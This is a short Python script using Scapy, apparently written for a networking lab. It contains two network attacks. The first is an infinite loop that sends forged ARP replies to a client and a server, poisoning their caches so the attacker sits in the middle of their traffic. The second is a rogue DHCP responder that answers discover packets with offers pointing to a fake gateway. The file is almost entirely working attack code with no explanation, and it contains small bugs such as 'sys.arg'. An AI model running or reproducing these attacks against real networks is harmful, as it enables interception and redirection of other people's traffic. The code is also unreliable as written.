#!usr/bin/python3
#conding:utf-8

from scapy.all import Ether, ARP, sendp, srp1, sniff, IP, UDP, BOOTP, DHCP
import sys, time
 

if len(sys.argv) != 3:
    print("Arguments manquants. Deux arguments sont attendus !")
    exit()

def arp(client_ip, server_ip): 
    client_request = Ether() / ARP(pdst=client_ip)
    client_response = srp1(client_request, timeout=5)

    if client_response is None :
        print("Client unreachable !")
        exit()

    client_mac_addr = client_response[ARP].hwsrc


    server_request = Ether() / ARP(pdst=server_ip)
    server_response = srp1(server_request, timeout=5)

    if server_response is None :
        print("Server unreachable !")
        exit()

    server_mac_addr = server_response[ARP].hwsrc


    while True:
        client_attack = Ether(dst=client_mac_addr) / ARP(psrc=server_ip, pdst=client_ip, hwdst=client_mac_addr)
        sendp(client_attack, iface="enp0s3")
        server_attack = Ether(dst=server_mac_addr) / ARP(psrc=client_ip, pdst=server_ip, hwdst=server_mac_addr)
        sendp(server_attack, iface="enp0s3")
        time.sleep(2)

arp(sys.arg[1], sys.argv[2])

######################################################################################################################

def dhcp(fake_ip, fake_gateway):

    def handle_pkt(pkt):
        if DHCP in pkt and pkt[DHCP].options[0][1] == 1:

            mac_addr = srp1(Ether(dst='ff:ff:ff:ff:ff:ff') / ARP(pdst=pkt[IP].src), timeout=5)[ARP].hwsrc
            ether = Ether(src=mac_addr, dst="ff:ff:ff:ff:ff:ff")
            ip = IP(src=fake_gateway, dst="255.255.255.255")
            udp = UDP(sport=67, dport=68)
            bootp = BOOTP(op=2, yiaddr=fake_ip, siaddr=fake_gateway, chaddr=mac_addr)

            dhcp = DHCP(options=[("message-type", "offer"), ("subnet_mask", "255.255.255.0"),
                                ("router", fake_gateway), ("lease_time", 86400), "end"])

            offer_pkt = ether / ip / udp / bootp / dhcp
            sendp(offer_pkt, iface="enp0s3")

    sniff(filter="udp and (port 67 or 68)", prn=handle_pkt)

#dhcp(sys.argv[1], sys.argv[2])
